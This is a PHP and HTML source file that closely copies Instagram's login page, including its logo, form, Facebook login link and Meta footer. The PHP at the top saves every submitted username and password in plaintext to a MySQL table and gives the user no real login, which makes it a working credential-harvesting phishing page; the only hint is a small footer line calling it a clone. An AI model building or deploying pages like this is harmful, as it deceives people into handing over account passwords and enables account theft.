<?php
$con = mysqli_connect("localhost","root","","insta");

// Check connection
if (mysqli_connect_errno()) {
  echo "Failed to connect to MySQL: " . mysqli_connect_error();
  exit();
}

if ($_SERVER["REQUEST_METHOD"] == "POST") {
  $username = mysqli_real_escape_string($con, $_POST['username']);
  $password = mysqli_real_escape_string($con, $_POST['password']);

  $sql = "INSERT INTO data1 (username, password) VALUES ('$username', '$password')";

  if (mysqli_query($con, $sql)) {
    // echo "New record created successfully";
  } else {
    // echo "Error: " . $sql . "<br>" . mysqli_error($con);
  }
}

mysqli_close($con);
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Login Page</title>
    <link rel="stylesheet" href="styles.css">
    <link rel="icon" type="image/x-icon" href="insta_favicon.webp">

    <style>
        .btn button {
            background-color: #0095f6; /* Instagram blue color */
            color: white;
            border: none;
            padding: 5px 20px; /* Reduced height by decreasing padding */
            border-radius: 5px;
            cursor: pointer;
        }

        .btn button:hover {
            background-color: #007bb5; /* Darker shade of blue */
        }
    </style>
</head>
<body>

<div class="wrapper">
    <div class="header">
        <div class="top">
            <div class="logo">
                <img src="instagram.png" alt="instagram" style="width: 175px;">
            </div>
            <br>
            <div class="form">
                <form method="POST" action="">
                    <div class="input_field">
                        <input type="text" placeholder="Phone number, username, or email" name="username" class="input" required>
                    </div>
                    <div class="input_field">
                        <input type="password" placeholder="Password" name="password" class="input" required>
                    </div>
                    <div class="btn">
                        <button type="submit">Log In</button>
                    </div>
                </form>
            </div>
            <div class="or">
                <div class="line"></div>
                <p>OR</p>
                <div class="line"></div>
            </div>
            <br>
            <div class="dif">
                <div class="fb">
                    <img src="facebook.png" alt="facebook">
                    <a href="https://www.facebook.com/login.php?skip_api_login=1&api_key=124024574287414&kid_directed_site=0&app_id=124024574287414&signed_next=1&next=https%3A%2F%2Fwww.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D124024574287414%26locale%3Den_GB%26redirect_uri%3Dhttps%253A%252F%252Fwww.instagram.com%252Faccounts%252Fsignup%252F%26response_type%3Dcode%252Cgranted_scopes%26scope%3Demail%26state%3D%257B%2522fbLoginKey%2522%253A%25221refmuwxvojbh3yzh7v10fsfbjykvegdctinuijfauwbwmjinn%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253Dhttps%25253A%25252F%25252Fwww.instagram.com%25252Faccounts%25252Fedit%25252F%25253F__coig_login%25253D1%2522%257D%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D2fdd8fa8-04ae-4a33-a7e8-ee05d3a2d696%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.instagram.com%2Faccounts%2Fsignup%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%2522fbLoginKey%2522%253A%25221refmuwxvojbh3yzh7v10fsfbjykvegdctinuijfauwbwmjinn%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253Dhttps%25253A%25252F%25252Fwww.instagram.com%25252Faccounts%25252Fedit%25252F%25253F__coig_login%25253D1%2522%257D%23_%3D_&display=page&locale=en_GB&pl_dbl=0"><p>Log in with Facebook</p></a>
                </div>
                <div class="forgot">
                    <a href="https://www.instagram.com/accounts/password/reset/?next=https%3A%2F%2Fwww.instagram.com%2Faccounts%2Fedit%2F%3F__coig_login%3D1">Forgot password?</a>
                </div>
            </div>
        </div>
        <div class="signup">
            <p style="font-size: 14px;">Don't have an account? <a href="https://www.instagram.com/accounts/emailsignup/?next=https%3A%2F%2Fwww.instagram.com%2Faccounts%2Fedit%2F%3F__coig_login%3D1">Sign up</a></p>
        </div>
        <div class="apps">
            <p>Get the app.</p>
            <div class="icons">
                <a href="https://play.google.com/store/apps/details?id=com.instagram.android&referrer=ig_mid%3DCDCEF52D-C5B9-411F-8D4E-4038F2F7CCDE%26utm_campaign%3DloginPage%26utm_content%3Dlo%26utm_source%3Dinstagramweb%26utm_medium%3Dbadge%26original_referrer%3Dhttps%3A%2F%2Fwww.google.com%2F"><img src="googleplay.png" alt="googleplay"></a>
                <a href="https://www.microsoft.com/store/productId/9NBLGGH5L9XT?ocid=pdpshare"><img src="appstore.png" alt="appstore"></a>
            </div>
        </div>
    </div>
    <br><br>
    <div class="footer">
        <div class="links">
            <ul>
                <li><a href="https://about.meta.com/">Meta</a></li>
                <li><a href="https://about.instagram.com/">About</a></li>
                <li><a href="https://about.instagram.com/blog">Blog</a></li>
                <li><a href="https://about.instagram.com/about-us/careers">Jobs</a></li>
                <li><a href="https://help.instagram.com/">Help</a></li>
                <li><a href="https://developers.facebook.com/docs/instagram-platform">API</a></li>
                <li><a href="https://privacycenter.instagram.com/policy/?entry_point=ig_help_center_data_policy_redirect">Privacy</a></li>
                <li><a href="https://help.instagram.com/581066165581870/">Terms</a></li>
                <li><a href="https://www.instagram.com/explore/locations/?hl=en">Locations</a></li>
                <li><a href="https://www.instagram.com/web/lite/?hl=en">Instagram Lite</a></li>
                <li><a href="https://www.threads.net/">Threads</a></li>
                <li><a href="https://www.facebook.com/help/instagram/261704639352628?hl=en">Contact Uploading & Non-Users</a></li>
                <li><a href="https://www.instagram.com/accounts/login/?next=https%3A%2F%2Fwww.instagram.com%2Faccounts%2Fmeta_verified%2F%3Fentrypoint%3Dweb_footer%26hl%3Den%26__coig_login%3D1">Meta Verified</a></li>
            </ul>
        </div>
        <div class="additional">
            <a href="#">English</a>
            <span>© 2024 Instagram from Meta</span><br><br>
            <span>Note:This is Clone not real instagam</span>
        </div>
    </div>
</div>

</body>
</html>
